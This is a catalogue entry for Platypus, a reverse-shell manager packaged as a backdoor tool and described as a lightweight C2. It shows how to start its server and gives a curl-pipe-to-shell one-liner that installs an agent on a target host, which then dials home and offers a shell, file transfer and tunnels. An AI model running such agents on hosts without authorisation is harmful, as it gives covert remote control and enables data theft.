---
name: "platypus"
categories:
  - blackarch-backdoor
version: "v1.5.1.r204.g0cb1673"
homepage: "https://github.com/WangYihang/Platypus"
packaged-by: [blackarch, aur]
blackarch-builddate: "2026-01-13"
build-system: go
license: LGPL-3.0-or-later
meta-checked: "2026-11-09"
github-repo: "WangYihang/Platypus"
github-stars: 1660
github-pushed: "2026-11-03"
github-archived: false
github-issues: 106
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 973
gh-activity-checked: "2026-11-09"
---

# platypus

> Reverse-shell session manager grown into a host-management hub: a TLS + protobuf agent/server pair giving interactive shells, file management and port forwarding across a fleet from one control plane.

## What it's for

Operating many hosts — a lab fleet or many engagement footholds — from a single screen. `platypus-server` is an API-only daemon that accepts TLS-encrypted agent connections on multiple ingress ports (so hosts in different networks share one hub) and exposes a REST + WebSocket API for admin tooling. `platypus-agent` on each managed host dials home and yields an interactive shell, chunked file read/write/upload/download, local and remote port forwards, and dynamic SOCKS5. Operators use the Wails desktop app or the static web UI (tabs for sessions, terminal, files, tunnels, listeners), a Python SDK, or the bearer-token REST API. Agents enroll with mTLS certificates issued by a project CA, distributed through single-use install tokens. It began as a reverse-shell manager and keeps that ergonomics; today it is closer to a lightweight fleet C2. Current constraint: one server process per database (token revocation is per-process, no cross-replica invalidation yet).

## Typical use cases

### Start the control server

```
./build/platypus-server
```

Outcome: the daemon runs in the foreground (Ctrl-C drains connections and exits gracefully within ~30 seconds). On first start it generates a `config.yml` from the bundled example with sensible defaults — TLS ingress on port 9443 carrying the REST API, agent link and installer download on one port — and listeners can be configured to auto-start from `config.yml`.

### Enroll a managed host

In the web UI or desktop app, open the project, click **Add Agent**, pick OS/arch and TTL, and run the generated one-liner on the target host:

```
curl -fsSL https://198.51.100.10:9443/api/v1/install/<one-shot-token> | sh
```

Outcome: the script downloads the agent with the project CA pinned (`curl --cacert`, no TOFU), enrolls using an embedded single-use token, and obtains its mTLS client certificate; the host then appears in the Sessions tab with terminal, files and tunnels available. The install token expires shortly after issuance and burns on first use — always render the one-liner from the UI rather than hand-writing URLs (the legacy `/agent/<host>:<port>` download path has been removed).

*No corpus evidence — derived from upstream documentation.*
